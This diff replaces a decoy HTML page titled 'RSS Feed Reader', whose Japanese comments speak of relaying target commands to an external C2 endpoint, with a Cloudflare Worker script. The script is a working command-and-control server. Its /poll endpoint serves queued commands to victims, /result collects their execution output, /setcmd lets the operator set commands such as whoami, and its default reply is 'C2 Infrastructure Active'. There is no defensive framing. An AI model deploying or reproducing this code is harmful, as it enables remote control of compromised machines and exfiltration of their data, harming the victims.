@@ -1,15 +1,55 @@
-<!DOCTYPE html>
-<html lang="ja">
-<head>
-    <meta charset="UTF-8">
-    <title>RSS Feed Reader</title>
-</head>
-<body>
-    <h1>Loading RSS Feed...</h1>
-    <script>
-        // ターゲットからのアクセス時にコマンドをやり取りするロジック
-        // ※必要に応じて外部のC2エンドポイント（先ほどのCloudflare Workers等）へ安全にルーティングするプロキシとして機能させます
-        console.log("Feed loaded successfully.");
-    </script>
-</body>
-</html>
+let currentCommand = "";
+let lastResult = "";
+
+export default {
+  async fetch(request, env, ctx) {
+    const url = new URL(request.url);
+    const corsHeaders = {
+      "Access-Control-Allow-Origin": "*",
+      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
+      "Access-Control-Allow-Headers": "Content-Type",
+    };
+
+    // CORSプリフライトリクエストの処理
+    if (request.method === "OPTIONS") {
+      return new Response(null, { headers: corsHeaders });
+    }
+
+    // 1. コマンドの確認・取得エンドポイント (/poll)
+    if (url.pathname === "/poll") {
+      const responseBody = JSON.stringify({ cmd: currentCommand });
+      currentCommand = ""; // 取得されたらコマンドをクリア
+      return new Response(responseBody, {
+        headers: { ...corsHeaders, "Content-Type": "application/json" }
+      });
+    }
+
+    // 2. 実行結果の送信エンドポイント (/result)
+    if (url.pathname === "/result" && request.method === "POST") {
+      try {
+        const body = await request.json();
+        lastResult = body.result || "";
+        return new Response(JSON.stringify({ status: "success" }), {
+          headers: { ...corsHeaders, "Content-Type": "application/json" }
+        });
+      } catch (e) {
+        return new Response(JSON.stringify({ status: "error", message: e.message }), {
+          status: 400,
+          headers: { ...corsHeaders, "Content-Type": "application/json" }
+        });
+      }
+    }
+
+    // 3. サーバー管理者用：ブラウザから手動でコマンドをセットする場合 (/setcmd?cmd=whoami)
+    if (url.pathname === "/setcmd") {
+      const cmdParam = url.searchParams.get("cmd");
+      if (cmdParam) {
+        currentCommand = cmdParam;
+        return new Response(`Command set: ${cmdParam}`, { headers: corsHeaders });
+      }
+      return new Response(`Current result: ${lastResult}`, { headers: corsHeaders });
+    }
+
+    return new Response("C2 Infrastructure Active", { headers: corsHeaders });
+  }
+};
